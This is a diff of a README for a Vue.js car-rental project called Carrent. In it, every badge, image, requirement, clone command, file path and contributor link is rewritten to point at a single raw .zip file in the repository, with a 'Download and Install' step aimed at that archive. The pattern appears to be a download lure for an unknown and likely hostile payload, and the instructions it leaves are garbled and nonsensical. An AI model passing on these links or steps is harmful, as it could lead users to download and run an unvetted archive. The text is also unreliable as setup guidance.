@@ -1,15 +1,15 @@
 # Carrent
 
-![GitHub repo size](https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip)
-![GitHub contributors](https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip)
-![GitHub stars](https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip)
-![GitHub forks](https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip)
-![Tweet](https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip%3A%2F%https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip%2FHiRahmat-Dev%2Fcarrent-vuejs
+![GitHub repo size](https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip)
+![GitHub contributors](https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip)
+![GitHub stars](https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip)
+![GitHub forks](https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip)
+![Tweet](https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip%3A%2F%https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip%2FHiRahmat-Dev%2Fcarrent-vuejs
 )
 
 <p align="center">
-  <img height="100" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip"/>&nbsp;
-  <img height="100" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip">
+  <img height="100" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip"/>&nbsp;
+  <img height="100" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip">
 </p>
 <p align="center">
   Built with Vue Js.
@@ -33,13 +33,13 @@
 
 ## Requirements
 
-- https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip - Download and Install [https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip](https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip).
-- https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip - Download and Install [https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip](https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip)
+- https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip - Download and Install [https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip](https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip).
+- https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip - Download and Install [https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip](https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip)
 
 ## Usage for development
 
 1. Open your terminal or command prompt
-2. Type `git clone https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip`
+2. Type `git clone https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip`
 3. Open the folder and type `npm install` for install dependencies
 4. Create Environment Variable [here](#create-environment-variable)
 5. Before run this, you must run backend first, [check here](#related-project-backend)
@@ -48,8 +48,8 @@
 ## Create Environment Variable
 
 ```
-$ touch https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip
-$ nano https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip
+$ touch https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip
+$ nano https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip
 ```
 
 ```
@@ -61,52 +61,52 @@ VUE_APP_SECRET_KEY_TOKEN=YOUR_SECRET_KEY
 ## Screenshots
 
 <div align="center">
-    <img width="860" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip">
+    <img width="860" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip">
 </div>
 <div align="center">
-    <img width="430" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip">   
-    <img width="430" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip">
+    <img width="430" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip">   
+    <img width="430" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip">
 </div>
 <div align="center">
-    <img width="430" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip">   
-    <img width="430" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip">
+    <img width="430" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip">   
+    <img width="430" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip">
 </div>
 
 ## Related Project (Backend)
 
-* [`Backend-Carrent`](https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip)
+* [`Backend-Carrent`](https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip)
 
 ## Contributors
 <center>
   <table>
     <tr>
       <td align="center">
-        <a href="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip">
-          <img width="150" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip" alt="Muhammad Yusuf"><br/>
+        <a href="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip">
+          <img width="150" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip" alt="Muhammad Yusuf"><br/>
           <b>Muhammad Yusuf</b>
         </a>
       </td>
       <td align="center">
-        <a href="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip">
-          <img width="150" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip" alt="Rahmat Hidayatullah"><br/>
+        <a href="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip">
+          <img width="150" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip" alt="Rahmat Hidayatullah"><br/>
           <b>Rahmat Hidayatullah</b>
         </a>
       </td>
       <td align="center">
-        <a href="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip">
-          <img width="150" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip" alt="Akbar Ismail"><br/>
+        <a href="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip">
+          <img width="150" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip" alt="Akbar Ismail"><br/>
           <b>Akbar Ismail</b>
         </a>
       </td>
       <td align="center">
-        <a href="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip">
-          <img width="150" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip" alt="azmprllynsa"><br/>
+        <a href="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip">
+          <img width="150" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip" alt="azmprllynsa"><br/>
           <b>azmprllynsa</b>
         </a>
       </td>
       <td align="center">
-        <a href="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip">
-          <img width="150" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/assets/Vue-js-with-Carrent-v2.9-alpha.1.zip" alt="Harun"><br/>
+        <a href="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip">
+          <img width="150" src="https://raw.githubusercontent.com/m-joseph27/Carrent_with-Vue.js/master/src/components/base_/Vue-js-Carrent-with-v3.0.zip" alt="Harun"><br/>
           <b>Harun</b>
         </a>
       </td>
